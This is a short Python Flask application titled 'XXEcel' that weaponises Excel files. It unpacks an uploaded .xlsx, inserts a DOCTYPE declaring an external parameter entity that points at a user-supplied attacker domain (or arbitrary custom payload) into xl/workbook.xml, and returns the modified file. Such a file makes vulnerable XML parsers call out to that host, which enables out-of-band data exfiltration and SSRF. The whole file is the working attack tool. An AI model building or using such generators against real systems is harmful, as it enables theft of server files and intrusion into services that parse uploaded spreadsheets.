# Title : XXEcel
# Author: nltt0
# Date: December 29, 2024 
# Version: v1.0

from flask import Flask, request, render_template, send_file
import os
import zipfile
from io import BytesIO

def modify_workbook_xml(zip_file_path, domain, custom_content):
    with zipfile.ZipFile(zip_file_path, 'r') as zf:
        temp_dir = "temp_xlsx"
        if not os.path.exists(temp_dir):
            os.mkdir(temp_dir)
        zf.extractall(temp_dir)

    workbook_path = os.path.join(temp_dir, 'xl', 'workbook.xml')
    if not os.path.exists(workbook_path):
        raise FileNotFoundError("workbook.xml not found in the uploaded .xlsx file")

    with open(workbook_path, 'r', encoding='utf-8') as f:
        xml_content = f.read()

    if custom_content:
        doc_type_line = custom_content
    else:
        doc_type_line = f'<!DOCTYPE r [<!ELEMENT r ANY > <!ENTITY % sp SYSTEM "{domain}">\n%sp;\n%param1;]>'

    lines = xml_content.splitlines()
    lines.insert(1, doc_type_line)

    modified_content = "\n".join(lines)
    with open(workbook_path, 'w', encoding='utf-8') as f:
        f.write(modified_content)

    output_zip_path = "modified_file.xlsx"
    with zipfile.ZipFile(output_zip_path, 'w') as zf:
        for root, _, files in os.walk(temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, temp_dir)
                zf.write(file_path, arcname)

    return output_zip_path

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', page="generate")

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files or 'domain' not in request.form:
        return "Missing file or domain", 400

    file = request.files['file']
    domain = request.form['domain']
    custom_content = request.form.get('custom_content', '').strip()

    if not file.filename.endswith('.xlsx'):
        return "Uploaded file must be an .xlsx file", 400

    temp_file = BytesIO()
    file.save(temp_file)
    temp_file.seek(0)

    try:
        modified_file = modify_workbook_xml(temp_file, domain, custom_content)
        return send_file(modified_file, as_attachment=True, download_name='modified_file.xlsx')
    except Exception as e:
        return f"Error: {str(e)}", 500
    finally:
        temp_file.close()
        if os.path.exists("modified_file.xlsx"):
            os.remove("modified_file.xlsx")


if __name__ == '__main__':
    app.run(debug=True)
